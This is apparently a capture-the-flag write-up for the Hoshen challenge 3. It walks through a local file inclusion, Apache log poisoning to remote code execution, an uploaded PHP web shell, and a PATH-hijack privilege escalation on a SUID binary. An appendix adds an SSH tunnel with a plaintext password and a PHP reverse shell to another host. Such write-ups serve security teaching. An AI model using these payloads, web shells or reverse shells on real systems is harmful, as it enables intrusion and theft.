# Challenge 3
Worked with AvivC, YaakovC.

## Description

After finishing [Challenge 2](Challenge2.md) and finding the external IP of the attacker, we can start Challenge 3.

We got an IP address: `http://13.67.133.176`.

## Solution

### Exploring the Website

Let's check out the website:

```console
root@kali:/media/sf_CTFs/hoshen/3# curl http://13.67.133.176
<!-- Bootstrap -->
<link href="web.css" rel="stylesheet">
<!--
Try to root me if you can.
You can't, I dare you :p
-->
<h1 id="header" class="text-primary">Red Team<br/>You Can start this part only if you got here through the PCAP</h1>

<div class="container list-article">
  <div class="btn-group pull-right" id="switch-view">
      <span class="icon-th-list"></span>

  </div>
  <div class="clearfix"></div>
  <div class="row">
    <div class="col-xs-12 article-wrapper">
      <article>
        <a href="test.php?file=gallery.html">Gallery</a>
        <div class="img-wrapper"><img src="pics/hacker.jpeg" alt="" /></div>
        <h1>Gallery</h1>
        <p>Enter Gallery By clicking here.</p>
      </article>
    </div>
    <div class="col-xs-12 article-wrapper">
      <article>
        <a href="test.php?file=register.html">Registration</a>
        <div class="img-wrapper"><img src="pics/enter.jpg" alt="" /></div>
        <h1>Registration</h1>
        <p>Enter Registration By clicking here.</p>
      </article>
    </div>
  </div>
</div>
```

This is a simple website with two main links. They both link to unimportant pages. The important thing is how they do it:

```html
<a href="test.php?file=gallery.html">Gallery</a>
<a href="test.php?file=register.html">Registration</a>
```

There's a good chance that `test.php` has a local file inclusion (LFI) vulnerability!

Let's test this:

```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=index.html"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /pages/</title>
</head>
<body>
<h1>Directory listing for /pages/</h1>
<hr>
<ul>
<li><a href="pics.php">pics.php</a></li>
<li><a href="registration">registration</a></li>
<li><a href="shimi">shimi</a></li>
</ul>
<hr>
</body>
</html>
```

### Exploiting LFI

We got a directory listing for `/pages/`. We can go on and try to explore the directory tree, but there's an additional fact that will be very helpful for us: If we call `test.php` without any parameters, we get the `PHPInfo` output:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl -s "http://13.67.133.176/test.php" | egrep "DOCUMENT_ROOT|SCRIPT_FILENAME|SERVER_NAME|SERVER_ADDR|APACHE_LOG_DIR "
<tr><td class="e">SERVER_NAME </td><td class="v">13.67.133.176 </td></tr>
<tr><td class="e">SERVER_ADDR </td><td class="v">10.0.0.7 </td></tr>
<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/html </td></tr>
<tr><td class="e">CONTEXT_DOCUMENT_ROOT </td><td class="v">/var/www/html </td></tr>
<tr><td class="e">SCRIPT_FILENAME </td><td class="v">/var/www/html/test.php </td></tr>
<tr><td class="e">APACHE_LOG_DIR </td><td class="v">/var/log/apache2 </td></tr>
<tr><td class="e">$_SERVER['SERVER_NAME']</td><td class="v">13.67.133.176</td></tr>
<tr><td class="e">$_SERVER['SERVER_ADDR']</td><td class="v">10.0.0.7</td></tr>
<tr><td class="e">$_SERVER['DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
<tr><td class="e">$_SERVER['CONTEXT_DOCUMENT_ROOT']</td><td class="v">/var/www/html</td></tr>
<tr><td class="e">$_SERVER['SCRIPT_FILENAME']</td><td class="v">/var/www/html/test.php</td></tr>
```

So we know where the server is running from, and several other important variables.

We can, for example, read `/etc/passwd`:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl http://13.67.133.176/test.php?file=../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
hoshenCtf:x:1000:1000:Ubuntu:/home/hoshenCtf:/bin/bash
```

This allows us to read any file we have access to, but can we do better? There's a great cheat sheet for LFI in [Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion).

It even has a recipe for LFI to RCE, which will allow us to execute code on the server. For this specific recipe to work, we need to be able to include a file which we can affect its content, such as the webserver access log: `/var/log/apache2/access.log`.

```console
root@kali:/media/sf_CTFs/hoshen/3# curl -s "http://13.67.133.176/test.php?file=../../../../var/log/apache2/access.log"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /test.php?file=gallery.html HTTP/1.1" 200 829 "http://13.67.133.176/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /pages/gallery.css HTTP/1.1" 200 925 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/sleep.jpg HTTP/1.1" 200 62003 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/kano.jpg HTTP/1.1" 200 22926 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/torha.jpg HTTP/1.1" 200 40999 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/sloth.jpg HTTP/1.1" 200 76794 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/78.jpg HTTP/1.1" 200 4555 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/schnitzel.jpg HTTP/1.1" 200 197961 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/alpha.jpg HTTP/1.1" 200 24565 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/joni.jpg HTTP/1.1" 200 116148 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:28 +0000] "GET /gallery/game.jpg HTTP/1.1" 200 39451 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:28 +0000] "GET /gallery/tall.jpg HTTP/1.1" 200 38880 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:27 +0000] "GET /gallery/shpig.jpg HTTP/1.1" 200 251051 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:28 +0000] "GET /gallery/fatich.jpg HTTP/1.1" 200 44868 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:28 +0000] "GET /gallery/trick.jpg HTTP/1.1" 200 327764 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:28 +0000] "GET /gallery/gateway.jpg HTTP/1.1" 200 11024 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:28 +0000] "GET /gallery/shay.jpg HTTP/1.1" 200 32417 "http://13.67.133.176/test.php?file=gallery.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
84.109.24.109 - - [14/Feb/2020:21:02:33 +0000] "GET /test.php?file=gallery.html HTTP/1.1" 200 828 "http://13.67.133.176/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
```

### LFI to RCE

As seen above, when a user makes a request to a webpage, several user attributes are written to the log. For example, the referrer: 
```console
root@kali:/media/sf_CTFs/hoshen/3# curl http://13.67.133.176/test.php?file=a --referer "I can control this"
root@kali:/media/sf_CTFs/hoshen/3# curl -s "http://13.67.133.176/test.php?file=../../../../var/log/apache2/access.log" | grep control
83.132.148.425 - - [14/Feb/2020:21:17:50 +0000] "GET /test.php?file=a HTTP/1.1" 200 147 "I can control this" "curl/7.64.0"
```

We can even execute PHP code under the correct circumstances:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl http://13.67.133.176/test.php?file=a --referer "<?php echo 'This is a test'; ?>"
root@kali:/media/sf_CTFs/hoshen/3# curl -s "http://13.67.133.176/test.php?file=../../../../var/log/apache2/access.log" | grep test
83.132.148.425 - - [14/Feb/2020:21:40:03 +0000] "GET /test.php?file=a HTTP/1.1" 200 147 "This is a test" "curl/7.64.0"
```

So instead of printing something, let's use PHP to create a shell.

What we want to do is upload the following PHP script to a writable location on the server:

```php
<?php 
if(isset($_REQUEST['cmd'])){ 
    echo "<pre>"; 
    $cmd = ($_REQUEST['cmd']); 
    _s_y_s_t_e_m($cmd); // Some Antivirus programs delete this writeup if it contains the command without underscores :-O
    echo "</pre>"; 
    die; 
}
?>
```

We'll encode this PHP script with base64 and upload it to a writable location on the server (`/tmp`):
```console
root@kali:/media/sf_CTFs/hoshen/3# curl http://13.67.133.176/test.php?file=foo --referer "-<?php system('echo PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWydjbWQnXSkpeyBlY2hvICI8cHJlPiI7ICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7IHN5c3RlbSgkY21kKTsgZWNobyAiPC9wcmU+IjsgZGllOyB9Pz4= | base64 -d > /tmp/shell'); ?>" 
```

We can then make requests to the script and they will be executed on the server:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST  --data-urlencode "cmd=ls -la"
<pre>total 36
drwxr-xr-x 5 root root 4096 Feb  8 13:46 .
drwxr-xr-x 3 root root 4096 Jan 22 08:00 ..
drwxr-xr-x 2 root root 4096 Feb  5 20:46 gallery
-rw-r--r-- 1 root root 1082 Feb  8 13:46 index.html
-rw-r--r-- 1 root root   19 Dec  5 08:59 index.php
drwxr-xr-x 5 root root 4096 Feb  8 01:07 pages
drwxr-xr-x 2 root root 4096 Jan 28 19:40 pics
-rw-r--r-- 1 root root  117 Dec  5 09:13 test.php
-rw-r--r-- 1 root root 3164 Feb  8 13:38 web.css
</pre>
```

We can check the source of `test.php`:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=cat test.php"
<pre><?php
$file = $_GET['file'];
if(isset($file))
{
include("pages/$file");
}
else
{
include("index.php");
}
?></pre>
```

We can run scripts:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=wget -O /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh " && echo
<pre></pre>
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=ls -la /tmp" && echo
<pre>total 60
drwxrwxrwt  2 root     root      4096 Feb 12 20:21 .
drwxr-xr-x 23 root     root      4096 Feb 11 06:45 ..
-rw-r--r--  1 www-data www-data 46631 Feb 12 20:21 LinEnum.sh
-rw-r--r--  1 www-data www-data   113 Feb 12 20:20 shell
</pre>
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=chmod +x /tmp/LinEnum.sh" && echo
<pre></pre>
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell"  -X POST --data-urlencode "cmd=/tmp/LinEnum.sh > linout.txt" && echo
<pre></pre>
```

One of the sections of the `LinEnum` report is about `SetUID` files:
```
SUID files:
-rwsr-xr-x 1 root root 35600 Mar 29  2018 /sbin/mount.cifs
-rwsr-xr-x 1 root root 8432 Jan 22 11:28 /bin/files
-rwsr-xr-x 1 root root 26696 Aug 22 23:47 /bin/umount
-rwsr-xr-x 1 root root 43088 Aug 22 23:47 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 149080 Jan 31 17:18 /usr/bin/sudo
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 109432 Oct 30 12:17 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
```

These executable files are able to run with the permissions of the owner, as opposed to regular executable files which run with the permissions of the current user.

Most of the files are known and expected, but one of them stands out:
```
-rwsr-xr-x 1 root root 8432 Jan 22 11:28 /bin/files
```

What is this file?
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=ls -al /bin/files"
<pre>-rwsr-xr-x 1 root root 8432 Jan 22 11:28 /bin/files
</pre>
```

If we try to run it, we get:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=/bin/files"
<pre>gallery
index.html
index.php
pages
pics
test.php
web.css
Welcome!
This is your files:
```

This doesn't feel like a real tool. Let's dump it and take a closer look:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=cat /bin/files | base64" 
<pre>f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAEAYAAAAAAABAAAAAAAAAALAZAAAAAAAAAAAAAEAAOAAJ
AEAAHQAcAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAA+AEAAAAAAAD4AQAAAAAAAAgA
AAAAAAAAAwAAAAQAAAA4AgAAAAAAADgCAAAAAAAAOAIAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
AAAAAAABAAAABQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFgJAAAAAAAAWAkAAAAAAAAAACAA
AAAAAAEAAAAGAAAAoA0AAAAAAACgDSAAAAAAAKANIAAAAAAAcAIAAAAAAAB4AgAAAAAAAAAAIAAA
AAAAAgAAAAYAAACwDQAAAAAAALANIAAAAAAAsA0gAAAAAADwAQAAAAAAAPABAAAAAAAACAAAAAAA
AAAEAAAABAAAAFQCAAAAAAAAVAIAAAAAAABUAgAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
AFDldGQEAAAAFAgAAAAAAAAUCAAAAAAAABQIAAAAAAAAPAAAAAAAAAA8AAAAAAAAAAQAAAAAAAAA
```

We copy the file to our local host and decode it:
```console
root@kali:/media/sf_CTFs/hoshen/3# cat files_base64.txt | base64 -d > files.elf
root@kali:/media/sf_CTFs/hoshen/3# file files.elf
files.elf: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2f94b5fff5379820dbdff60ed3652d152cb908e1, not stripped
```

Opening it with Ghidra, we see the following simple implementation:
```c
undefined8 main(void)
{
  setuid(0);
  setgid(0);
  puts("Welcome!");
  puts("This is your files:");
  system("ls");
  return 1;
}
```

### Privilege Escalation

What `/bin/files` does is to basically set the effective user to `root` and to run `ls` (as root).
Naively, this prints the contents of the current working directory. But what if we can trick the program into executing a different `ls`, such as a script we choose to call `ls`? In that case, it will execute the script as root, running any commands we feed it. Let's do that.

First, we set up a working directory:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=mkdir /tmp/.w"
<pre></pre>
```

Then, we craft the script we want to run. Here it is:
```bash
export PATH=/tmp/.w:$PATH
cd /tmp/.w
echo "/bin/ls -alR  /root > /tmp/.w/out.txt" > ls
chmod +x ls
/bin/files
```

What this says is:
1. Update the `PATH` so that our working directory is first in the search path (before `/bin/ls`)
2. Cd into our working directory
3. Create the `ls` script we want to run: It will print the contents of `/root` into `out.txt`
4. Make the script executable
5. Run `/bin/files` which will execute our `ls` script

We encode the script as base64 and upload it to the server, saving it as `script`:

```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell&command=ls" -X POST --data-urlencode "cmd=echo ZXhwb3J0IFBBVEg9L3RtcC8udzokUEFUSApjZCAvdG1wLy53CmVjaG8gIi9iaW4vbHMgLWFsUiAgL3Jvb3QgPiAvdG1wLy53L291dC50eHQiID4gbHMKY2htb2QgK3ggbHMKL2Jpbi9maWxlcw== | base64 -d > /tmp/.w/script"  && echo
```

We make it executable:
```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=chmod +x /tmp/.w/script"
```

Run it, and read the result:

```console
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=/tmp/.w/script" 
<pre>Welcome!
This is your files:
</pre>root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=ls -al /tmp/.w" 
<pre>total 16
drwxr-xr-x 2 www-data www-data 4096 Feb 16 18:23 .
drwxrwxrwt 3 root     root     4096 Feb 16 18:21 ..
-rwxr-xr-x 1 www-data www-data   32 Feb 16 18:23 ls
-rw-r--r-- 1 root     root        0 Feb 16 18:23 out.txt
-rwxr-xr-x 1 www-data www-data  106 Feb 16 18:22 script
</pre>
root@kali:/media/sf_CTFs/hoshen/3# curl "http://13.67.133.176/test.php?file=../../../../tmp/shell" -X POST --data-urlencode "cmd=cat /tmp/.w/out.txt"
<pre>/root:
total 192
drwx------  7 root root   4096 Feb  9 02:52 .
drwxr-xr-x 23 root root   4096 Feb 11 06:45 ..
-rw-------  1 root root  17256 Feb 13 13:53 .bash_history
-rw-r--r--  1 root root   3106 Apr  9  2018 .bashrc
drwx------  2 root root   4096 Jan 22 08:38 .cache
drwx------  3 root root   4096 Jan 22 08:38 .gnupg
-rw-------  1 root root     28 Jan 22 09:06 .lesshst
drwxr-xr-x  3 root root   4096 Jan 22 08:37 .local
-rw-r--r--  1 root root    148 Aug 17  2015 .profile
-rw-r--r--  1 root root     66 Jan 22 08:40 .selected_editor
drwx------  2 root root   4096 Feb  8 19:08 .ssh
-rw-------  1 root root  10723 Feb  9 02:52 .viminfo
-rwxr-xr-x  1 root root    100 Jan 22 08:42 clearlog.sh
-rwx------  1 root root 110592 Jan 29 20:32 crackme.exe
-r--------  1 root root    257 Feb  2 14:35 flag.txt
drwxr-xr-x  2 root root   4096 Feb  6 11:06 visitors

/root/.cache:
total 8
drwx------ 2 root root 4096 Jan 22 08:38 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
-rw-r--r-- 1 root root    0 Jan 22 08:38 motd.legal-displayed

/root/.gnupg:
total 12
drwx------ 3 root root 4096 Jan 22 08:38 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
drwx------ 2 root root 4096 Jan 22 08:38 private-keys-v1.d

/root/.gnupg/private-keys-v1.d:
total 8
drwx------ 2 root root 4096 Jan 22 08:38 .
drwx------ 3 root root 4096 Jan 22 08:38 ..

/root/.local:
total 12
drwxr-xr-x 3 root root 4096 Jan 22 08:37 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
drwx------ 3 root root 4096 Jan 22 08:37 share

/root/.local/share:
total 12
drwx------ 3 root root 4096 Jan 22 08:37 .
drwxr-xr-x 3 root root 4096 Jan 22 08:37 ..
drwx------ 2 root root 4096 Jan 22 08:37 nano

/root/.local/share/nano:
total 12
drwx------ 2 root root 4096 Jan 22 08:37 .
drwx------ 3 root root 4096 Jan 22 08:37 ..
-rw------- 1 root root   63 Feb  6 07:11 search_history

/root/.ssh:
total 12
drwx------ 2 root root 4096 Feb  8 19:08 .
drwx------ 7 root root 4096 Feb  9 02:52 ..
-rw------- 1 root root 2024 Feb 14 23:46 authorized_keys

/root/visitors:
total 588
drwxr-xr-x 2 root root   4096 Feb  6 11:06 .
drwx------ 7 root root   4096 Feb  9 02:52 ..
-rw-r--r-- 1 root root 426434 Feb 16 18:29 logged_users.txt
-rw-r--r-- 1 root root 150271 Feb 16 18:29 total_visitors.txt
-rw-r--r-- 1 root root   2659 Feb 16 18:20 uniq_visitors.txt
</pre>
```

We read the `root` directory!

We can dump the contents of `flag.txt` using the same method:
```
Send this md5 flag to: cyberchallenge2020@gmail.com with "flag" as Subject and we will contact you...

================================
a231d0273d108b9d3e00596304e2f5e0
================================
Nice Job skid :).

Now try to solve the next step...
```

And read `crackme.exe` as well (encoding it as base64), to get to the next level:

```console
root@kali:/media/sf_CTFs/hoshen/3# file crackme.exe
/root/CTFs/hoshen/crackme.exe: PE32 executable (console) Intel 80386, for MS Windows
```

## Appendix A

In the first few days of the CTF, it was possible to arrive to this challenge directly from the first challenge without decrypting the PCAP. This is a short description of how this could be done.

After logging on to `cuser@104.43.243.221` via SSH, it was possible to run `nmap` and search for additional hosts on the same subnet. `10.0.0.7`, which is the internal address of `13.67.133.176`, was one of the hosts identified. It was then possible to perform a port scan and find port 80 open.

Using SSH tunneling, it was possible to tunnel remote port 80 to a local port and view the website on a local browser:
```console
root@kali:/media/sf_CTFs/hoshen/1# sshpass -p 'Sec0ndPh@se' ssh -N -L 9999:10.0.0.7:80 cuser@104.43.243.221
```

The command above allows us to view the website on local port 9999:
```console
root@kali:/media/sf_CTFs/hoshen/1# curl -s localhost:9999/index.php | grep Hostname
<tr><td class="e">Hostname:Port </td><td class="v">13.67.133.176:80 </td></tr>
```

Since `index.php` called `phpinfo()`, it was possible to find the external address of the host. 

This also made it easier to open a reverse shell, saving the need to open ports in the router.

First, we open a listner on `10.0.0.5` (which is the internal address of `104.43.243.221`):
```console
cuser@HoshenCtf2:~$ nc -lvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
```

Then, using the RCE exploit via the website, we run the following code on `10.0.0.7`:
```php
<?php
$sock = fsockopen("10.0.0.5",4445);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

Now, back to `10.0.0.5` for the reverse shell:
```console
cuser@HoshenCtf2:~$ nc -lvp 4445
Listening on [0.0.0.0] (family 0, port 4445)
Connection from 10.0.0.7 36238 received!
/bin/sh: 0: can't access tty; job control turned off
$ ls
gallery
index.html
index.php
pages
pics
test.php
web.css
$
```

At some point, `nmap` and `nc` were removed and access to `10.0.0.7` was blocked.
